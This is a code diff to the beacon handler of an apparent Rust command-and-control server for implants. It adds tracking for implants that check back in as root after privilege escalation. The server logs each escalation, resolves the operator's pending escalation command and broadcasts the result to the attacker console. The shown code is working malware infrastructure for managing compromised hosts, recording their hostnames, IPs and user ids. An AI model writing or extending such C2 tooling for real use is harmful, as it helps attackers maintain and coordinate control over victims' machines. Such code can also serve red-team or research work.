@@ -91,16 +91,32 @@ async fn process_beacon(
     proto: u32,
 ) -> (StatusCode, Json<serde_json::Value>) {
     // Register/update session
-    let is_new = state.ensure_session(implant_id, hostname, ip, tier, os, arch, uid, proto).await;
-
-    if is_new {
-        state.broadcast_event(C2Event::NewSession {
-            implant_id: implant_id.to_string(),
-            hostname: hostname.to_string(),
-            ip: ip.to_string(),
-            tier: tier.to_string(),
-            uid,
-        });
+    match state.ensure_session(implant_id, hostname, ip, tier, os, arch, uid, proto).await {
+        crate::state::SessionUpdate::New => {
+            state.broadcast_event(C2Event::NewSession {
+                implant_id: implant_id.to_string(),
+                hostname: hostname.to_string(),
+                ip: ip.to_string(),
+                tier: tier.to_string(),
+                uid,
+            });
+        }
+        crate::state::SessionUpdate::Escalated { from_uid } => {
+            // Same session just checked in as root (privesc re-exec). Resolve
+            // orphaned command bookkeeping so the operator sees the escalation
+            // command complete and isn't left polling for a result that the
+            // replaced process could never send.
+            util::log_line(&state.all_log, &format!(
+                "PRIVESC  host={}  uid {} -> 0 (escalation, same session)", implant_id, from_uid
+            ));
+            state.resolve_escalation(implant_id, from_uid).await;
+            state.broadcast_event(C2Event::CommandResult {
+                implant_id: implant_id.to_string(),
+                command_id: "escalation".to_string(),
+                status: "escalated".to_string(),
+            });
+        }
+        crate::state::SessionUpdate::Existing => {}
     }
 
     state.broadcast_event(C2Event::Beacon {
